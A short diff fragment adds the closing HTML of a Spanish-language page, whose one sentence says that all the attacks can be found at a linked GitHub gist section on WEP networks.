+                            <p>Todos los ataques se encuentran <a href="https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb#redes-wep" target="_blank" class="text-decoration-none">aqui</a></p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+
+
+
+    </body>
+
+</html>
